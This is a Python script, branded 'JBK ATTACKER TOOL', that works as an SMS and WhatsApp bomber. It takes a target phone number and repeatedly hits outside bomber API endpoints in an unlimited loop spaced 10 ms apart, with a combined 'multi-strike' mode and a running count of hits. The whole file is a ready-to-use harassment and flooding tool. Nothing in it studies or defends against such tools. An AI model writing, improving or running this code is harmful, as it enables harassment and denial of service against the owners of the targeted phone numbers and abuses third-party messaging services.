import os
import asyncio
import aiohttp
import time

# --- API Config ---
API_SMS = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"
API_WP = "https://get-wp-creds-json-and-access-token.onrender.com/code"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

async def call_api(session, mode, target):
    try:
        if mode == "sms":
            async with session.get(API_SMS, params={"number": target}, timeout=5) as r:
                return r.status == 200
        elif mode == "wp":
            async with session.get(API_WP, params={"number": target}, timeout=5) as r:
                return r.status == 200
        return False
    except:
        return False

async def run_bomber(mode):
    print("\033[1;33m" + "━"*45 + "\033[0m")
    target = input("\033[1;36m 🎯 TARGET NUMBER (92xxx): \033[0m").strip()
    print("\033[1;31m [!] UNLIMITED MODE: ON (Press Ctrl+C to Stop)\033[0m")
    print("\033[1;33m" + "━"*45 + "\033[0m")

    success = 0
    async with aiohttp.ClientSession() as session:
        try:
            while True:
                if mode == "multi":
                    tasks = [call_api(session, "sms", target), call_api(session, "wp", target)]
                    await asyncio.gather(*tasks)
                    success += 2
                else:
                    await call_api(session, mode, target)
                    success += 1

                print(f"\r \033[1;32m⚡ BLASTING... | TOTAL HITS: {success} \033[0m", end="")
                await asyncio.sleep(0.01) # Ultra Fast
        except KeyboardInterrupt:
            print(f"\n\n\033[1;92m Blast Successful! Total Hits Sent: {success}\033[0m")
            input("\n\033[1;37m [ Press Enter to Back ]\033[0m")

async def main():
    # Auto-open channel (Optional)
    # os.system("termux-open-url https://whatsapp.com/channel/0029VbB4Y41EVccLcCk8lK1p")

    while True:
        clear()
        # Simple Header
        print("\033[1;32m" + "━"*45)
        print("\033[1;37m        🚀  \033[1;31mJBK ATTACKER TOOL\033[1;37m  🚀")
        print("\033[1;32m" + "━"*45)
        print("\033[1;37m  DEVELOPER : \033[1;33mAB REHMAN | FAHAD")
        print("\033[1;37m  VERSION   : \033[1;31m5.0 (LITE EDITION)")
        print("\033[1;32m" + "━"*45 + "\033[0m")

        print("\n \033[1;36m[01]\033[1;37m START SMS ATTACK")
        print(" \033[1;36m[02]\033[1;37m START WHATSAPP ATTACK")
        print(" \033[1;31m[03] MULTI-STRIKE (SMS + WP) \033[1;33m🔥\033[0m")
        print(" \033[1;36m[00]\033[1;37m EXIT TOOL")

        choice = input("\n \033[1;32m[+] SELECT OPTION: \033[0m").strip()

        if choice in ["1", "01"]: await run_bomber("sms")
        elif choice in ["2", "02"]: await run_bomber("wp")
        elif choice in ["3", "03"]: await run_bomber("multi")
        elif choice in ["0", "00"]: 
            print("\n\033[1;31m [!] Shutting Down...\033[0m")
            break

if __name__ == "__main__":
    asyncio.run(main())
